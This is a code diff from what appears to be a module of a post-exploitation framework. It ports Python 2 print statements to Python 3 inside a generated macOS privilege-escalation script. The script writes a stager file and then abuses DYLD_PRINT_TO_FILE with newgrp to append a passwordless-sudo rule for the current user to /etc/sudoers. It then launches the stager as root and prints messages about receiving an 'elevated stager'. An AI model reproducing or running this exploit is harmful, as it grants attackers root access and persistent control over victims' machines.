@@ -118,16 +118,16 @@ class Module(object):
         fileName = self.options['FileName']['Value']
         script = """
 import os
-print "Writing Stager to {filename}..."
+print("Writing Stager to {filename}...")
 file = open("{fullpath}","w")
 file.write("{filecontents}")
 file.close()
-print "Attempting to execute stager as root..."
+print("Attempting to execute stager as root...")
 try:
 	os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullpath} &")
-	print "Successfully ran command, you should be getting an elevated stager"
+	print("Successfully ran command, you should be getting an elevated stager")
 except:
-	print "[!] Could not execute payload!"
+	print("[!] Could not execute payload!")
             
 	""".format(fullpath=fullPath, filecontents=launcher, filename=fileName)
         
